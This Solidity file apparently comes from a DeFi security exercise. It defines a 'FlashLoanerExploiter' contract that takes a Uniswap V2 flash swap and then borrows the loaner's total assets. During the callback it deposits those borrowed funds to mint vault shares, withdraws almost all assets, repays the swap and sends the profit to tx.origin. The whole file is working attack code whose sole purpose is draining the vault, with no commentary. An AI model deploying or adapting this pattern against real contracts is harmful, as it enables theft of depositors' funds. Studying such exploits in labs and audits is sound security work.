// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/console.sol";

interface IFlashLoaner {
    function flash(address recipient, uint256 amount, bytes calldata data) external;
    function totalAssets() external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token1() external returns (address);
}

contract FlashLoanerExploiter {
    IERC20 token;
    IFlashLoaner flashLoaner;
    IUniswapV2Pair pair;

    constructor(address _flashLoanerAddress, address _tokenAddress, address _uniswapPairAddress) {
        flashLoaner = IFlashLoaner(_flashLoanerAddress);
        token = IERC20(_tokenAddress);
        pair = IUniswapV2Pair(_uniswapPairAddress);
    }

    function attack() public {
        pair.swap(90_000e18, 0, address(this), bytes("not empty"));
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0, //usdc
        uint256 _amount1,
        bytes calldata _data
    ) external {
        flashLoaner.flash(address(this), flashLoaner.totalAssets() - 1, "");
        flashLoaner.withdraw(flashLoaner.totalAssets() - 1, address(this), address(this));
        uint256 loanPlusInterest = (_amount0 * (10 ** 18) * 1000 / 997 / (10 ** 18)) + 1; // exact amount owed
        token.transfer(msg.sender, loanPlusInterest); // pay back flashloan
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }

    function flashCallback(uint256 fee, bytes calldata data) public {
        token.approve(address(flashLoaner), type(uint256).max);
        flashLoaner.deposit(token.balanceOf(address(this)), address(this));
    }
}
